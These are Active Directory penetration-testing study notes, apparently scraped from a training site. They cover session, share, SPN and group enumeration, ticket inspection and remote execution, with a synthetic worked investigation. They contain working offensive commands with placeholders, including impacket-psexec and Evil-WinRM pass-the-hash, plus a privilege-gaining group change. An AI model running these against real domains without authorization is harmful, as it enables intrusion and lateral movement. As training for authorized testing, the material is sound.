title: 6.5.4 Expected behavior and useful security boundaries
text: id="654-expected-behavior-and-useful-security-boundaries">6.5.4 Expected behavior and useful security boundaries §6 — AD Notes | §6.0 — Quick Reference Use these as contextual expectations, not a claim that every organization uses one default configuration. Check the exact object, policy, version and effective permissions. Investigation Often expected / intended Interesting clue requiring validation Do not conclude Directory reads Authenticated users can read many users/groups/ SPNs Secret-bearing readable attributes or excessive useful object rights LDAP read access means directory administration SYSVOL / NETLOGON Domain users read policy and logon material Readable secrets, or controlled content with a useful privileged consumer SYSVOL readability itself is a vulnerability Service SPNs Services register Kerberos identities Useful account plus feasible offline password recovery An SPN is a weak password Preauthentication Normally required for Kerberos accounts Explicitly disabled on an account with compatible request conditions A timeout proves no-preauth or password validity Groups / ACLs Narrow intended administrative delegation A controlled trustee has effective unintended useful control A group name or one ACE proves effective access Remote access Service-specific rights restrict host logon/execution A useful reachable endpoint authorizes the controlled identity Valid domain credentials mean remote execution Sessions Users log on and network sessions appear/disappear A fresh valuable session on a host you can suitably control A session guarantees accessible plaintext credentials LAPS / gMSA Managed random credentials and restricted reads Excessive usable read/decryption rights on useful accounts Merely seeing the object is a weakness Credential protection Protection varies with OS, policy and runtime state A source is actually accessible with suitable privileges An absent registry value proves protection is disabled Replication DCs and deliberately delegated services replicate Controlled principal has effective secret-replication rights Member-server local admin implies DCSync AD CS / GPO / delegation Legitimate enterprise functionality The complete selected misuse conditions align A scanner label or isolated flag proves exploitation For each clue, record: object/host -> current identity -> exact observed permission/configuration -> missing condition -> decisive check -> resulting capability . Use the §6.0 — focused checks for commands and annotated examples. Complete AD procedures | Mechanisms

title: 6.2.7 Enumerate and interpret sessions
text: id="627-enumerate-and-interpret-sessions">6.2.7 Enumerate and interpret sessions §6 — AD Notes | §6.0 — Quick Reference | §6.5.3 — Read output A scoped candidate host and permission to perform the selected session query. Other users' live credential material needs separate host privileges and protection checks. Where to look: Inspect session evidence only on relevant hosts. Record who, which host, how collected and when. Join the observation to your actual ability to access/control that host; then select a justified credential source. Expected behavior / secure boundary: User sessions are ordinary and volatile. Modern Windows can restrict enumeration. An empty or denied result is not proof of no sessions, and a session does not guarantee accessible or reusable credentials. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. <h2

title: 6.2.7.1 Session enumeration using PowerView
text: id="6271-session-enumeration-using-powerview">6.2.7.1 Session enumeration using PowerView Run: Windows PowerShell with reviewed PowerView. Requires: RPC/API connectivity and the query-specific rights on selected hosts. Effect: Queries session evidence; denial means incomplete coverage. Get-NetSession -ComputerName COMPUTER -Verbose Get-NetLoggedon -ComputerName COMPUTER <h2

title: 6.2.7.2 Session enumeration using PsLoggedOn
text: id="6272-session-enumeration-using-psloggedon">6.2.7.2 Session enumeration using PsLoggedOn Run: Windows with PsLoggedOn. Requires: Relevant Remote Registry/session connectivity and permissions. Effect: Queries logon evidence; the query itself can create a network session. PsLoggedOn.exe \\COMPUTER What this checks: Session tools use different APIs/evidence. Remote Registry/profile artifacts, network sessions and interactive logons are not identical observations. The query itself can create network-session noise. <h2

title: 6.2.7.3 Interpret the output
text: id="6273-interpret-the-output">6.2.7.3 Interpret the output Normalized observations: the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. Computer: APP01 UserName: EXAMPLE\admin_ops Source: Session collection Other host: Access denied Interpreted result What it establishes Required next check Continue at admin_ops on APP01 A time-bound session candidate. Verify freshness, host control and what kind of session was observed. §6.2.6.1 — Validate host-specific access rights You only have a low-privilege APP01 shell You can run as yourself there. Establish a privilege path before assuming process-memory access. §6.3.5.1 — Select a credential source on a controlled host Access denied The collector lacked a needed right or access path. Use another authorized source; mark this collection inconclusive . §6.2.7.1 — Enumerate and interpret sessions Stop when: Source, time and collection coverage are recorded for the selected host. Revisit only when: The session ages out or a relevant new host-control capability appears. <h2

title: 6.2.2 Enumerate shares, SYSVOL and NETLOGON
text: id="622-enumerate-shares-sysvol-and-netlogon">6.2.2 Enumerate shares, SYSVOL and NETLOGON §6 — AD Notes | §6.0 — Quick Reference | §6.5.3 — Read output A reachable SMB endpoint and an identified anonymous, local or domain authentication context. These contexts must be recorded separately. Where to look: Begin with SYSVOL/NETLOGON on a DC and relevant application, deployment or IT shares discovered on scoped hosts. Inspect logon scripts, installation configuration, backups and references to other servers. List before retrieving selected files. Expected behavior / secure boundary: Domain-user read access to SYSVOL and NETLOGON is generally intentional. Directory listing, file reading and file writing are separate permissions. Share names, dollar suffixes and a READ label do not settle an individual file's effective access. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. <h2

title: 6.2.2.1 Baseline share enumeration from Windows
text: id="6221-baseline-share-enumeration-from-windows">6.2.2.1 Baseline share enumeration from Windows Run: Windows. Requires: Selected SMB server; current network identity and share/object permissions. Effect: Lists shares/directories; does not test file write or execution. net view \\DC_HOST dir \\DC_HOST\SYSVOL dir \\DC_HOST\NETLOGON <h2

title: 6.2.2.2 Share enumeration using Kali SMB clients
text: id="6222-share-enumeration-using-kali-smb-clients">6.2.2.2 Share enumeration using Kali SMB clients Run: Kali / Linux. Requires: SMB connectivity and explicit DOMAIN/USER context; smbclient may prompt for its password. Effect: Lists shares/files; get retrieves only a selected authorized file. nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' --shares smbclient -L //DC_IP -U 'DOMAIN/USER' smbclient //DC_IP/SYSVOL -U 'DOMAIN/USER' -c 'recurse ON; ls' smbclient //DC_IP/SHARE -U 'DOMAIN/USER' What this checks: net view and --shares inventory share-level candidates. smbclient then tests the named share with an explicit identity; ls, cd and get test progressively narrower objects. A successful file read can disclose information without granting execution. <h2

title: 6.2.2.3 Interpret the output
text: id="6223-interpret-the-output">6.2.2.3 Interpret the output Raw/view evidence first. These are synthetic, abbreviated tool or graph-view excerpts. Graph relationship rows are a representative view, not collector console output. Version-specific wording and spacing can differ. The normalized observations below are a separate interpretation. <summary

title: 6.2.2.3.1 Expected — raw evidence
text: id="variant-6-2-2-3-1">6.2.2.3.1 Expected — raw evidence Command/view: smbclient -L //DC_IP -U DOMAIN/USER Sharename Type Comment --------- ---- ------- NETLOGON Disk Logon server share SYSVOL Disk Logon server share Decisive clue: SYSVOL and NETLOGON appear in the inventory. Supported: Share names were listed in this authentication context. Still missing: Connecting, listing a directory and reading a selected file remain separate operations. Next check: §6.2.2.1 — Enumerate shares, SYSVOL and NETLOGON <summary

title: 6.2.2.3.2 Interesting — raw evidence
text: id="variant-6-2-2-3-2">6.2.2.3.2 Interesting — raw evidence Command/view: Selected file retrieval and its contents smb: \scripts\> get map-drives.ps1 getting file \scripts\map-drives.ps1 as map-drives.ps1 File content: $share = "\\FS01\Finance" Decisive clue: FS01 and Finance in the readable script. Supported: A host/share reference was found through a demonstrated file read. Still missing: Scope, address, reachability and current-identity access to that share remain untested. Next check: §6.2.6.1 — Validate host-specific access rights <summary

title: 6.2.2.3.3 Failed / inconclusive — raw evidence
text: id="variant-6-2-2-3-3">6.2.2.3.3 Failed / inconclusive — raw evidence Command/view: get config.ini inside an authenticated share session NT_STATUS_ACCESS_DENIED opening remote file \config.ini Decisive clue: The selected file open was denied. Supported: This file read failed; retain any already-proven authentication/listing. Still missing: Determine the relevant object permission or use another permitted artifact; do not infer no credentials exist anywhere. Next check: §6.5.1.1 — Diagnose the failed boundary Normalized observations: the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. Share: SYSVOL READ Share: Deploy READ Deploy/scripts/map-drives.ps1 File content: $share = "\\FS01\Finance" Interpreted result What it establishes Required next check Continue at SYSVOL READ Expected directory access can be available. Inspect relevant scripts/policy material; do not report readability alone as a weakness. §6.2.3.1 — Interpret scripts, configuration and exposed secrets map-drives.ps1 A selected script contains a host/share reference. Record FS01 and Finance, check scope/address and test access with the current identity. §6.2.6.1 — Validate host-specific access rights NT_STATUS_ACCESS_DENIED on get The requested read was denied. Retain successful authentication/listing evidence; inspect another authorized object. §6.5.1.1 — Diagnose the failed boundary Stop when: The selected share/file access boundary and any useful clue are recorded. Revisit only when: A new credential, permission or referenced file changes the access context. <h2

title: 6.2.2.4 Decide and continue
text: id="6224-decide-and-continue">6.2.2.4 Decide and continue Result Decision Next numbered section Enabled after validation A readable file contains a credential-shaped value: classify its type and identity before reuse. §6.3.2.1 — Classify recovered credentials and their scope Ruled out in this context A relevant share is unreadable with this identity: mark that access context ruled out and continue. §6.2.1.1 — Baseline enumeration — users and groups Inconclusive / failed check Listing works but file reading is untested: keep the content claim inconclusive. §6.2.2.1 — Enumerate shares, SYSVOL and NETLOGON <h2

NetExec summarizes share candidates. SMB connectivity and correct account scope are required. title: 6.4.3 Execute using SMB or WMI mechanisms
text: id="643-execute-using-smb-or-wmi-mechanisms">6.4.3 Execute using SMB or WMI mechanisms §6 — AD Notes | §6.0 — Quick Reference | §6.5.3 — Read output A scoped host, compatible authentication and verified remote execution rights. A visible writable share alone is insufficient. Where to look: For service-based execution inspect administrative share/file delivery and service-control rights. For WMI/DCOM inspect RPC endpoint/dynamic transport and namespace/COM authorization . Track execution separately from output retrieval. Expected behavior / secure boundary: Remote administrative execution is deliberately privileged. A local Administrators membership can be affected by remote token filtering/policy. An output-file failure can occur after execution; avoid blindly rerunning a state-changing command. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. <h2

title: 6.4.3.1 SMB execution using Impacket
text: id="6431-smb-execution-using-impacket">6.4.3.1 SMB execution using Impacket Run: Kali / Linux with Impacket. Requires: Required administrative share/service-control rights and compatible authentication. Effect: Remote execution; may upload files and create/remove a service. <h3

title: 6.4.3.1.1 Password
text: id="64311-password">6.4.3.1.1 Password # Password impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET' <h3

title: 6.4.3.1.2 NT hash / Pass-the-Hash
text: id="64312-nt-hash--pass-the-hash">6.4.3.1.2 NT hash / Pass-the-Hash # NT hash / Pass-the-Hash impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' <h2

title: 6.4.3.2 SMB execution using native Windows PsExec
text: id="6432-smb-execution-using-native-windows-psexec">6.4.3.2 SMB execution using native Windows PsExec Run: Windows with Sysinternals PsExec. Requires: Required target administrative/service rights and selected credentials. Effect: Remote execution/service activity; first use can accept the tool EULA. PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe What this checks: PsExec-style and SMBExec-style mechanisms differ in service, file and output handling. They require their respective access paths. WMI is a separate mechanism with RPC/dynamic-port requirements, documented in the linked full procedure. <h2

title: 6.4.3.3 Interpret the output
text: id="6433-interpret-the-output">6.4.3.3 Interpret the output Normalized observations: the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. SMB authentication: success ADMIN$ file upload: access denied WMI: process created, return value 0 Output retrieval: failed Interpreted result What it establishes Required next check Continue at ADMIN$ upload denied The selected delivery step lacks access. Recheck administrative context or choose a method whose actual requirements are satisfied. §6.2.6.1 — Validate host-specific access rights WMI return 0 The process-creation API accepted the request. Verify its effect/output and run-as identity; no interactive shell is implied. §6.5.2.1 — Re-enumerate after an identity or host change Output retrieval failed The result channel failed. Check whether execution already happened before retrying. §6.5.1.1 — Diagnose the failed boundary Stop when: Execution acceptance, run-as identity, effect and output-channel result are separated. Revisit only when: New service/file/RPC rights or result-channel evidence appears. <h2

title: 6.4.3.4 Decide and continue

title: 6.2.4 Enumerate service accounts and SPNs
text: id="624-enumerate-service-accounts-and-spns">6.2.4 Enumerate service accounts and SPNs §6 — AD Notes | §6.0 — Quick Reference | §6.5.3 — Read output A domain directory query context, with user/group enumeration available. Where to look: Inspect servicePrincipalName on selected accounts. Associate the service class, hostname and port with the owning user/computer, its groups, account state and useful rights. User-backed service identities and machine accounts have different typical password conditions. Expected behavior / secure boundary: SPNs are normal Kerberos registrations. A service ticket being requestable is expected behavior and does not prove a weak password, reachable service or privileged account. Long random managed/computer secrets are usually poor offline-guessing candidates. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. <h2

Requires: Tool execution prerequisites and permitted domain directory queries; do not assume the binary is installed. Effect: Lists registrations; the shown -Q/-L forms do not add SPNs. setspn -Q */* setspn -L ACCOUNT <h2

title: 6.2.4.2 SPN enumeration using PowerView
text: id="6242-spn-enumeration-using-powerview">6.2.4.2 SPN enumeration using PowerView Run: Windows PowerShell with reviewed PowerView. Requires: Loaded compatible module and authenticated directory query context. Effect: Reads SPN-owning account attributes. Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof,useraccountcontrol,pwdlastset What this checks: setspn inventories registrations; PowerView joins SPNs to account attributes. This is account/service mapping. Requesting offline guessing material and deciding whether cracking is worthwhile belong to the next page. <h2

title: 6.2.4.3.1 Expected — raw evidence
text: id="variant-6-2-4-3-1">6.2.4.3.1 Expected — raw evidence Command/view: setspn -L ACCOUNT (computer-account example) Registered ServicePrincipalNames for CN=WS01,OU=Computers,DC=example,DC=test: HOST/WS01 HOST/WS01.example.test Decisive clue: HOST registrations on a computer account. Supported: These are ordinary service-identity registrations. Still missing: No weak secret or useful controlled account right was demonstrated. Next check: §6.2.1.1 — Baseline enumeration — users and groups <summary

title: 6.2.4.3.2 Interesting — raw evidence
text: id="variant-6-2-4-3-2">6.2.4.3.2 Interesting — raw evidence Command/view: setspn -L ACCOUNT (user-backed service example) Registered ServicePrincipalNames for CN=svc_reports,OU=Services,DC=example,DC=test: MSSQLSvc/DB01.example.test:1433 Decisive clue: MSSQLSvc registration owned by svc_reports. Supported: The account/service relationship is a selected Kerberoasting candidate. Still missing: Account value/type, ticket-request prerequisites and offline feasibility still determine usefulness. Next check: §6.3.4.1 — Kerberoasting — selection and output <summary

title: 6.2.4.3.3 Failed / inconclusive — raw evidence
text: id="variant-6-2-4-3-3">6.2.4.3.3 Failed / inconclusive — raw evidence Command/view: PowerShell directory-query failure excerpt Exception calling "FindAll" with "0" argument(s): "The server is not operational." Decisive clue: The directory query did not complete. Supported: No complete SPN inventory was obtained. Still missing: Check selected directory server, authentication context and route; this is not proof of no SPNs. Next check: §6.1.1.1 — Establish the current identity and domain Normalized observations: the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. samaccountname: svc_reports serviceprincipalname: MSSQLSvc/DB01.example.test:1433 memberof: CN=Reporting Operators,OU=Groups,DC=example,DC=test Interpreted result What it establishes Required next check Continue at MSSQLSvc A SQL Server service-class registration. Associate it with DB01:1433; verify reachability separately. §6.2.6.1 — Validate host-specific access rights svc_reports The SPN-owning account. Inspect account type, groups and useful permissions. §6.2.1.1 — Baseline enumeration — users and groups Reporting Operators An account-value clue. Determine actual rights rather than inferring privilege from the group name. §6.2.5.1 — Enumerate and validate effective object permissions Stop when: The service registration is tied to its owning account and a concrete account-value question. Revisit only when: A new account right, service route or justified password strategy changes the value. <h2

title: 6.2.4.4 Decide and continue
text: id="6244-decide-and-continue">6.2.4.4 Decide and continue Result Decision Next numbered section Enabled after validation A user SPN account has useful rights and compatible request conditions: consider selected Kerberoasting. §6.3.4.1 — Kerberoasting — selection and output Ruled out in this context The account offers no useful transition or has an infeasible managed secret: deprioritize offline guessing. §6.2.5.1 — Enumerate and validate effective object permissions Inconclusive / failed check The service is unreachable: account enumeration still stands; remote service access remains unproved. §6.2.6.1 — Validate host-specific access rights <h2

title: 6.3.6 Inspect Kerberos tickets and compatible use
text: id="636-inspect-kerberos-tickets-and-compatible-use">6.3.6 Inspect Kerberos tickets and compatible use §6 — AD Notes | §6.0 — Quick Reference | §6.5.3 — Read output Access to the current logon session's ticket cache, or an explicitly obtained ticket file. Other LUIDs typically need elevation. Where to look: Inspect client identity/realm, server SPN , start/end/renewal times, ticket type and file format. Identify which process/logon session or ccache actually uses the ticket. Expected behavior / secure boundary: TGTs and service tickets in an authenticated session are ordinary. A ticket does not reveal a password, grant local administrator rights or authorize every service. The local process identity can differ from its network Kerberos identity. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. <h2

title: 6.3.6.1 Baseline — Windows command prompt
text: id="6361-baseline--windows-command-prompt">6.3.6.1 Baseline — Windows command prompt Run: Windows. Requires: Current cache for ordinary inspection; session-wide enumeration can need elevation. Effect: Reads ticket metadata; does not purge or import tickets. klist klist tgt klist sessions What this checks: klist inventories cache metadata. TGTs address krbtgt/REALM; a cifs/HOST or HTTP/HOST ticket targets a specific service. sessions enumeration can need extra rights. Do not purge a cache while diagnosing it. <h2

title: 6.3.6.2 Interpret the output
text: id="6362-interpret-the-output">6.3.6.2 Interpret the output Normalized observations: the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. Client: analyst @ EXAMPLE.TEST Server: cifs/FS01.example.test @ EXAMPLE.TEST End Time: already expired Another ticket: krbtgt/EXAMPLE.TEST Interpreted result What it establishes Required next check Continue at cifs/FS01 An SMB service-scoped ticket. Use a compatible client and matching hostname/SPN; check authorization separately. §6.4.1.1 — Select a compatible remote-access mechanism Expired End Time This ticket is outside its validity window. Obtain a legitimate current ticket/context; importing it does not repair expiry. §6.3.6.1 — Inspect Kerberos tickets and compatible use krbtgt/EXAMPLE.TEST A TGT, not a universal service ticket. Check KDC connectivity, realm and downstream service-ticket requests. §6.1.1.1 — Establish the current identity and domain Stop when: Client, realm, SPN, validity and selected cache/logon context are understood. Revisit only when: Ticket validity, cache context, hostname or represented identity changes. <h2

title: 6.3.6.3 Decide and continue
text: id="6363-decide-and-continue">6.3.6.3 Decide and continue Result Decision Next numbered section Enabled after validation Identity, validity, SPN and client cache context match: test the intended service authorization. §6.4.1.1 — Select a compatible remote-access mechanism Ruled out in this context Wrong SPN, expired ticket or incompatible file format: rule out that attempted use until corrected. §6.3.6.1 — Inspect Kerberos tickets and compatible use Inconclusive / failed check Ticket loaded but service fails: separate DNS/time, authentication and endpoint rights. §6.5.1.1 — Diagnose the failed boundary <h2

title: 6.2.1 Baseline enumeration — users and groups
text: id="621-baseline-enumeration--users-and-groups">6.2.1 Baseline enumeration — users and groups §6 — AD Notes | §6.0 — Quick Reference | §6.5.3 — Read output A working domain query context. Native Windows commands use the current network context; off-domain clients need explicit supported authentication . Where to look: Query domain users, then expand selected accounts and custom or privileged groups. Follow direct and nested memberships toward an actual object right or host permission. Inspect descriptions and account state without assuming names reveal privileges. Expected behavior / secure boundary: Authenticated directory reads and membership in Domain Users are ordinarily expected. Administrative-looking names, adminCount and old password dates are leads, not proof of current administrative rights. A direct memberOf list may omit nested and primary-group relationships. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. <h2

title: 6.2.1.1 Baseline enumeration with native Windows commands
text: id="6211-baseline-enumeration-with-native-windows-commands">6.2.1.1 Baseline enumeration with native Windows commands Run: Windows. Requires: Current domain query context; /domain selects directory rather than local accounts. Effect: Reads user, group and policy information. net user /domain net user USER /domain net group /domain net group "Domain Admins" /domain net group "GROUP" /domain net accounts /domain nltest /domain_trusts /all_trusts net view /domain net view \\DC_HOST <h2

title: 6.2.1.2 Enumeration using RSAT PowerShell
text: id="6212-enumeration-using-rsat-powershell">6.2.1.2 Enumeration using RSAT PowerShell Run: Windows PowerShell with RSAT. Requires: ActiveDirectory module plus permitted authenticated directory access. Effect: Reads directory objects; does not grant the returned memberships. Get-Command -Module ActiveDirectory Get-ADDomain Get-ADForest Get-ADDomainController -Filter * Get-ADUser -Filter * -Properties Enabled,Description,MemberOf,ServicePrincipalName,UserPrincipalName,PasswordLastSet,LastLogonDate,AdminCount Get-ADGroup -Filter * -Properties GroupScope,GroupCategory,Members,Description Get-ADGroupMember -Identity 'GROUP' -Recursive Get-ADComputer -Filter * -Properties DNSHostName,OperatingSystem,OperatingSystemVersion,ServicePrincipalName,TrustedForDelegation,LastLogonDate Get-ADTrust -Filter * What this checks: The /domain switch selects domain objects rather than the local SAM. User detail connects an account to memberships; group detail identifies principals to investigate. RSAT adds structured queries only when its module exists. <h2

title: 6.2.1.3 Interpret the output
text: id="6213-interpret-the-output">6.2.1.3 Interpret the output Raw/view evidence first. These are synthetic, abbreviated tool or graph-view excerpts. Graph relationship rows are a representative view, not collector console output. Version-specific wording and spacing can differ. The normalized observations below are a separate interpretation. <summary

title: 6.2.1.3.1 Expected — raw evidence
text: id="variant-6-2-1-3-1">6.2.1.3.1 Expected — raw evidence Command/view: net user USER /domain User name analyst Account active Yes Global Group memberships *Domain Users The command completed successfully. Decisive clue: Global Group memberships: Domain Users. Supported: An ordinary account and one displayed membership are visible. Still missing: Nested/primary memberships and useful object/host rights are not established. Next check: §6.2.5.1 — Enumerate and validate effective object permissions <summary

title: 6.2.1.3.2 Interesting — raw evidence
text: id="variant-6-2-1-3-2">6.2.1.3.2 Interesting — raw evidence Command/view: net user USER /domain User name analyst Account active Yes Global Group memberships *Domain Users *Support The command completed successfully. Decisive clue: The additional Support membership. Supported: A custom group is worth tracing into an exact right. Still missing: The name Support does not identify what it can administer. Next check: §6.2.5.1 — Enumerate and validate effective object permissions <summary

title: 6.2.1.3.3 Failed / inconclusive — raw evidence
text: id="variant-6-2-1-3-3">6.2.1.3.3 Failed / inconclusive — raw evidence Command/view: net user /domain System error 1355 has occurred. The specified domain either does not exist or could not be contacted. Decisive clue: The domain-query dependency failed. Supported: This command did not establish a directory user list. Still missing: Domain context, DC discovery, DNS and route need checking; no account-password conclusion follows. Next check: §6.1.1.1 — Establish the current identity and domain Normalized observations: the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. User name: svc_reports Account active: Yes Global Group memberships: *Domain Users *Reporting Operators Group: Reporting Operators Members: svc_reports, analyst Interpreted result What it establishes Required next check Continue at svc_reports A discovered enabled account; its name suggests a purpose only. Inspect its SPNs , effective groups and any documented object/host rights. §6.2.4.1 — Enumerate service accounts and SPNs Reporting Operators A custom group shared with the controlled user. Determine what this group can access or modify; the name does not establish admin. §6.2.5.1 — Enumerate and validate effective object permissions Get-ADUser is not recognized RSAT is absent or not loaded. Use native commands, ADSI, PowerView or authenticated LDAP. §6.2.1.1 — Baseline enumeration — users and groups Stop when: Selected accounts, memberships and the next useful right are identified; unexplained names remain leads. Revisit only when: A new identity or changed membership reveals different effective access. <h2

title: 6.2.1.4 Decide and continue
text: id="6214-decide-and-continue">6.2.1.4 Decide and continue Result Decision Next numbered section Enabled after validation A membership reaches a useful right: validate that right on the exact target. §6.2.5.1 — Enumerate and validate effective object permissions Ruled out in this context A selected group has no relevant access in this context: continue another lead. §6.2.2.1 — Enumerate shares, SYSVOL and NETLOGON Inconclusive / failed check Membership is partial or a query is denied: retain the gap; do not record the group as empty. §6.2.1.1 — Baseline enumeration — users and groups <h2

title: 6.4.2 Access using WinRM or RDP
text: id="642-access-using-winrm-or-rdp">6.4.2 Access using WinRM or RDP §6 — AD Notes | §6.0 — Quick Reference | §6.5.3 — Read output A compatible credential, reachable target listener and the service-specific endpoint/logon right. Windows-domain naming and Kerberos requirements still apply. Where to look: For WinRM inspect endpoint availability and authorization ; for RDP inspect remote-interactive logon rights, group/policy, NLA and credential-mode support. Use the complete RDP procedure for FreeRDP variants. Expected behavior / secure boundary: A WinRM or RDP listener is not a grant of access. Non-admin remote-management access can be intentionally delegated. A remote WinRM session may lack a usable onward credential context even when the first hop succeeds. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. <h2

title: 6.4.2.1 WinRM credential and transport variants
text: id="6421-winrm-credential-and-transport-variants">6.4.2.1 WinRM credential and transport variants Run: Kali / Linux with Evil-WinRM. Requires: Compatible material, reachable WinRM listener and endpoint authorization. Effect: Creates a remote command session; target commands can change state. <h3

title: 6.4.2.1.1 Password; omit -p to prompt where supported
text: id="64211-password-omit--p-to-prompt-where-supported">6.4.2.1.1 Password; omit -p to prompt where supported # Password; omit -p to prompt where supported evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' <h3

title: 6.4.2.1.2 NT hash
text: id="64212-nt-hash">6.4.2.1.2 NT hash # NT hash evil-winrm -i TARGET_HOST -u USER -H NT_HASH <h3

title: 6.4.2.1.3 HTTPS listener

title: 6.4.2.2 WinRM using native WinRS
text: id="6422-winrm-using-native-winrs">6.4.2.2 WinRM using native WinRS Run: Windows with WinRS. Requires: Reachable authorized WinRM endpoint and selected network credentials. Effect: Executes the selected remote identity/host verification command. winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" What this checks: Evil-WinRM and WinRS are different clients to WinRM. Their credential modes and platform requirements differ. A password/hash example must match the material; the full procedure also documents ticket and HTTPS variants. <h2

title: 6.4.2.3 Interpret the output
text: id="6423-interpret-the-output">6.4.2.3 Interpret the output Normalized observations: the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. WinRM: authentication succeeds Command: whoami -> EXAMPLE\analyst Onward access to \\FS01\Finance: access denied RDP: requested logon type not granted Interpreted result What it establishes Required next check Continue at whoami on target The session executed as the displayed identity. Verify host/ token and re-enumerate from that state. §6.5.2.1 — Re-enumerate after an identity or host change Onward share denied Could be second-hop credential context or share authorization. Inspect the network identity and service rights; do not invalidate the first hop. §6.5.1.1 — Diagnose the failed boundary RDP logon type denied A service-specific policy boundary. Check remote-interactive rights/deny policies or choose another authorized service. §6.4.1.1 — Select a compatible remote-access mechanism Stop when: First-hop identity/host and the tested endpoint result are verified. Revisit only when: Endpoint policy, logon rights or onward network credential context changes. <h2

title: 6.6.3 One continuous worked AD investigation
text: id="663-one-continuous-worked-ad-investigation">6.6.3 One continuous worked AD investigation §6 — Chapter 6 | 6.6 Study aids This is one continuous hypothetical investigation. The objective is a verified new host-access capability, not an invented domain-compromise result. All names and observations are synthetic; commands remain references for the later practice phase. <h2

title: 6.6.3.1 Starting state and first question
text: id="6631-starting-state-and-first-question">6.6.3.1 Starting state and first question Assume a supplied low-privilege EXAMPLE\analyst identity and a usable domain query route. Verify the token /network identity and domain/DC context. The account is a member of Support; the group name is not an administrative right. §6.1.1.1 — Establish the current identity and domain §6.2.1.1 — Baseline enumeration — users and groups <h2

title: 6.6.3.2 A readable file creates a scoped lead
text: id="6632-a-readable-file-creates-a-scoped-lead">6.6.3.2 A readable file creates a scoped lead SYSVOL is readable. A selected logon script names FS01\Finance. This proves a readable reference, not Finance access. Add the host/share to the investigation map, establish scope/address and test the selected operation with the current identity. §6.2.2.1 — Enumerate shares, SYSVOL and NETLOGON §6.2.6.1 — Validate host-specific access rights <h2

title: 6.6.3.3 Dead end: listing did not grant the wanted read
text: id="6633-dead-end-listing-did-not-grant-the-wanted-read">6.6.3.3 Dead end: listing did not grant the wanted read SMB authenticates and lists Finance, but the selected configuration file is denied. Keep the valid identity and listing evidence. Close the claim that its contents or credentials are known. Do not repeat the denied read unchanged; return only after a relevant identity/right change. §6.5.1.1 — Diagnose the failed boundary <h2

title: 6.6.3.4 A service clue does not settle the attack
text: id="6634-a-service-clue-does-not-settle-the-attack">6.6.3.4 A service clue does not settle the attack An SPN identifies svc_reports on DB01. Its useful rights and password feasibility are unknown. Record the account/service relationship, then rank it against stronger existing evidence; do not request every ticket merely because a service registration exists. §6.2.4.1 — Enumerate service accounts and SPNs <h2

title: 6.6.3.5 Validate a graph edge manually
text: id="6635-validate-a-graph-edge-manually">6.6.3.5 Validate a graph edge manually A graph suggests Support can add a member to Helpdesk and Helpdesk has a useful APP01 remote-management relationship. Check the controlled membership, the group member-write operation/GUID, scope and applicable deny rules. Separately validate what Helpdesk enables on APP01 and whether its endpoint is reachable. §6.2.5.1 — Enumerate and validate effective object permissions §6.4.1.1 — Select a compatible remote-access mechanism <h2

title: 6.6.3.6 Paper transition and verification
text: id="6636-paper-transition-and-verification">6.6.3.6 Paper transition and verification For this worked example only, assume all conditions are verified and the scoped practice authorization allows the specific group change. The canonical procedure supplies the exact modification and restoration steps. A successful directory change is not yet a fresh token or a remote session. Refresh the relevant authentication context and test the intended endpoint; verify host and whoami output after a session is established. §6.3.7.1 — Choose a permission-backed identity transition §6.4.2.1 — Access using WinRM or RDP <h2

title: 6.6.3.7 New state, new questions
text: id="6637-new-state-new-questions">6.6.3.7 New state, new questions The synthetic session now verifies analyst on APP01. Re-enumerate the token, relevant readable configuration, object/host rights and routes from that state. An onward share denial may concern a second-hop credential context; it does not erase the verified first hop. No higher privilege, accessible LSASS material or domain administration is assumed. §6.5.2.1 — Re-enumerate after an identity or host change <h2

title: 6.6.3.8 Why the route changed
text: id="6638-why-the-route-changed">6.6.3.8 Why the route changed Observation Supported decision Revisit condition Finance file read denied Preserve auth/listing; close that read hypothesis New relevant identity or file permission SPN found, account value unknown Keep as a ranked candidate Useful rights or justified recovery feasibility Effective group control plus useful host relationship Validate the smallest identity/host transition Current memberships, scope and endpoint authorization New verified APP01 session Re-enumerate from the new state Another identity, privilege, host or route change

title: 6.3.11 Gain a more useful domain identity
